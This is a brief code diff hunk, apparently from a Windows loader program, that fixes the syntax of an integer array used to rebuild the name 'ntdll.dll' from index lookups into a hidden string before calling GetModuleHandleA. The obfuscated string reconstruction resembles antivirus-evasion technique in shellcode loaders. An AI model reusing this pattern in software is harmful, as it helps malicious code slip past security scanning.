@@ -159,7 +159,7 @@ int main(int argc, char* argv[]) {
     SIZE_T coolSize = sizeof(cool);
     //Get a handle to the ntdll.dll library
     //hello
-    int ntt[] = { [39, 45, 29, 37, 37, 62, 29, 37, 37] };
+    int ntt[] = {39, 45, 29, 37, 37, 62, 29, 37, 37};
     const wchar_t* ntd = getoriginal(ntt, big_string, sizeof(ntt));
     HMODULE hNtdll = GetModuleHandleA(getoriginal(ntt, big_string, sizeof(ntt)));
     
